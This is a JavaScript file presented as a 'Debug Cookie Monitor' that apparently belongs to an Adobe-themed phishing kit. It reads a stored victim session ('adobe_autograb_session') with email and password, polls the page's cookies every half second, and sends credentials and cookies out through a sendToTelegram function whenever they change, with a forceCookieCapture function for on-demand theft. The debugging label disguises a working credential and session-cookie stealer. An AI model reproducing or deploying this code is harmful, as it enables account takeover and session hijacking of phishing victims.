// Debug Cookie Monitor
(function() {
    'use strict';
    
    console.log('🔍 Debug Cookie Monitor loaded');
    
    // Enhanced cookie debugging
    function debugCookies() {
        const cookies = document.cookie;
        const allCookies = {};
        
        if (cookies) {
            cookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    allCookies[name] = decodeURIComponent(value);
                }
            });
        }
        
        console.log('🍪 Current cookies:', {
            raw: cookies,
            parsed: allCookies,
            count: Object.keys(allCookies).length,
            domain: window.location.hostname,
            url: window.location.href,
            timestamp: new Date().toISOString()
        });
        
        return allCookies;
    }
    
    // Monitor all cookie changes
    let lastCookieState = document.cookie;
    
    function checkCookieChanges() {
        const currentCookies = document.cookie;
        if (currentCookies !== lastCookieState) {
            console.log('🔄 Cookie change detected:', {
                before: lastCookieState,
                after: currentCookies,
                domain: window.location.hostname,
                timestamp: new Date().toISOString()
            });
            lastCookieState = currentCookies;
            debugCookies();
            
            // Auto-send to backend when cookies change
            if (window.sendToTelegram && currentCookies) {
                const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
                if (sessionData.email) {
                    console.log('🚀 Auto-sending cookie changes to Telegram...');
                    window.sendToTelegram({
                        email: sessionData.email,
                        password: sessionData.password || 'Cookie change detected',
                        provider: sessionData.provider || 'Auto-detected',
                        cookies: currentCookies,
                        documentCookies: currentCookies,
                        timestamp: new Date().toISOString(),
                        action: 'cookie_change_detected',
                        domain: window.location.hostname
                    });
                }
            }
        }
    }
    
    // Check for changes more frequently
    setInterval(checkCookieChanges, 500);
    
    // Monitor cross-origin requests
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        console.log('🌐 Fetch request:', url, 'Cookies before:', document.cookie);
        
        return originalFetch.apply(this, args).then(response => {
            console.log('📥 Fetch response:', url, 'Cookies after:', document.cookie);
            return response;
        });
    };
    
    // Expose debug functions globally
    window.debugCookies = debugCookies;
    window.clearAllCookies = function() {
        document.cookie.split(";").forEach(function(c) { 
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
        });
        console.log('🧹 All cookies cleared');
    };
    
    window.setCookie = function(name, value, days = 7) {
        const expires = new Date(Date.now() + days * 864e5).toUTCString();
        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
        console.log(`🍪 Cookie set: ${name}=${value}`);
        
        // Trigger change detection
        setTimeout(checkCookieChanges, 100);
    };
    
    // Add function to force cookie capture and send
    window.forceCookieCapture = function() {
        const cookies = document.cookie;
        console.log('🔥 Force capturing cookies:', cookies);
        
        if (window.sendToTelegram && cookies) {
            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
            window.sendToTelegram({
                email: sessionData.email || 'force-capture@domain.com',
                password: sessionData.password || 'Force captured',
                provider: sessionData.provider || 'Force Capture',
                cookies: cookies,
                documentCookies: cookies,
                timestamp: new Date().toISOString(),
                action: 'force_capture',
                domain: window.location.hostname
            });
        }
        
        return cookies;
    };
    
    // Initial debug
    setTimeout(debugCookies, 100);
    
    console.log('🔍 Debug Cookie Monitor active - Use debugCookies(), clearAllCookies(), setCookie(), forceCookieCapture() in console');
})();